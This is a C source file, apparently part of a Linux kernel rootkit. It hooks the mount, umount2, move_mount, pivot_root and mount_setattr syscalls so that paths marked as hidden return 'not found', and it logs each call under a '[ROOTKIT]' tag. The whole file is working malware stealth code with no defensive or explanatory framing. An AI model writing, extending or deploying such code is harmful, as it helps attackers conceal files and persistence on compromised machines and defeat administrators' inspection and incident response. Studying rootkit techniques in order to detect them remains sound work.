#include "files.h"
#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <uapi/linux/mount.h>

#define FSMOUNT_VALID_FLAGS                                                         \
    (MOUNT_ATTR_RDONLY | MOUNT_ATTR_NOSUID | MOUNT_ATTR_NODEV | MOUNT_ATTR_NOEXEC | \
     MOUNT_ATTR__ATIME | MOUNT_ATTR_NODIRATIME | MOUNT_ATTR_NOSYMFOLLOW)
#define MOUNT_SETATTR_VALID_FLAGS       (FSMOUNT_VALID_FLAGS | MOUNT_ATTR_IDMAP)
#define MOUNT_SETATTR_PROPAGATION_FLAGS (MS_UNBINDABLE | MS_PRIVATE | MS_SLAVE | MS_SHARED)

// sys_mount syscall hook handler
SYSCALL_HOOK_HANDLER5(mount, orig_mount, p_regs, char __user *, s_dev_name, char __user *,
                      s_dir_name, char __user *, s_type, unsigned long, ui32_flags, void __user *,
                      p_data)
{
    pr_info("[ROOTKIT] mount(%p, %p, %p, %lu, %p)\n", s_dev_name, s_dir_name, s_type, ui32_flags,
            p_data);

    // Check if the target directory is hidden
    if (is_pathname_hidden(AT_FDCWD, s_dir_name, LOOKUP_FOLLOW)) {
        return -ENOENT;
    }

    return do_check_hidden(orig_mount, p_regs, AT_FDCWD, s_dev_name, 0);
}

// sys_umount2 syscall hook handler
SYSCALL_HOOK_HANDLER2(umount2, orig_umount2, p_regs, char __user *, s_name, int, i32_flags)
{
    pr_info("[ROOTKIT] umount2(%p, %d)\n", s_name, i32_flags);

    IF_U (i32_flags & ~(MNT_FORCE | MNT_DETACH | MNT_EXPIRE | UMOUNT_NOFOLLOW)) {
        return -EINVAL;
    }

    return do_check_hidden(orig_umount2, p_regs, AT_FDCWD, s_name,
                           i32_flags & UMOUNT_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
}

// sys_move_mount syscall hook handler
SYSCALL_HOOK_HANDLER5(move_mount, orig_move_mount, p_regs, int, i32_from_dfd, char __user *,
                      s_from_pathname, int, i32_to_dfd, char __user *, s_to_pathname, unsigned int,
                      ui32_flags)
{
    pr_info("[ROOTKIT] move_mount(%d, %p, %d, %p, %x)\n", i32_from_dfd, s_from_pathname, i32_to_dfd,
            s_to_pathname, ui32_flags);

    IF_U (ui32_flags & ~MOVE_MOUNT__MASK) {
        return -EINVAL;
    }

    if (is_pathname_hidden(i32_from_dfd, s_from_pathname,
                           ui32_flags & MOVE_MOUNT_F_SYMLINKS ? LOOKUP_FOLLOW : 0)) {
        return -ENOENT;
    }

    return do_check_hidden(orig_move_mount, p_regs, i32_to_dfd, s_to_pathname,
                           ui32_flags & MOVE_MOUNT_T_SYMLINKS ? 0 : AT_SYMLINK_NOFOLLOW);
}

// sys_pivot_root syscall hook handler
SYSCALL_HOOK_HANDLER2(pivot_root, orig_pivot_root, p_regs, const char __user *, s_new_root,
                      const char __user *, s_put_old)
{
    pr_info("[ROOTKIT] pivot_root(%p, %p)\n", s_new_root, s_put_old);

    if (is_pathname_hidden(AT_FDCWD, s_put_old, LOOKUP_FOLLOW)) {
        return -ENOENT;
    }

    return do_check_hidden(orig_pivot_root, p_regs, AT_FDCWD, s_new_root, 0);
}

// sys_mount_setattr syscall hook handler
SYSCALL_HOOK_HANDLER5(mount_setattr, orig_mount_setattr, p_regs, int, i32_dfd, const char __user *,
                      s_path, unsigned int, ui32_flags, struct mount_attr __user *, p_uattr, size_t,
                      sz_usize)
{
    int i_err;
    struct mount_attr attr;

    pr_info("[ROOTKIT] mount_setattr(%d, %p, %x, %p, %zu)\n", i32_dfd, s_path, ui32_flags, p_uattr,
            sz_usize);

    // Use same checks as in fs/namespace.c:4269

    if (ui32_flags & ~(AT_EMPTY_PATH | AT_RECURSIVE | AT_SYMLINK_NOFOLLOW | AT_NO_AUTOMOUNT)) {
        return -EINVAL;
    }

    IF_U ((sz_usize > PAGE_SIZE)) {
        return -E2BIG;
    }

    IF_U (sz_usize < MOUNT_ATTR_SIZE_VER0) {
        return -EINVAL;
    }

    i_err = copy_struct_from_user(&attr, sizeof(attr), p_uattr, sz_usize);
    if (i_err) {
        return i_err;
    }

    if (attr.attr_set == 0 && attr.attr_clr == 0 && attr.propagation == 0) {
        return 0;
    }

    if (attr.propagation & ~MOUNT_SETATTR_PROPAGATION_FLAGS) {
        return -EINVAL;
    }

    if (hweight32(attr.propagation & MOUNT_SETATTR_PROPAGATION_FLAGS) > 1) {
        return -EINVAL;
    }

    if ((attr.attr_set | attr.attr_clr) & ~MOUNT_SETATTR_VALID_FLAGS) {
        return -EINVAL;
    }

    return do_check_hidden(orig_mount_setattr, p_regs, AT_FDCWD, s_path, ui32_flags);
}
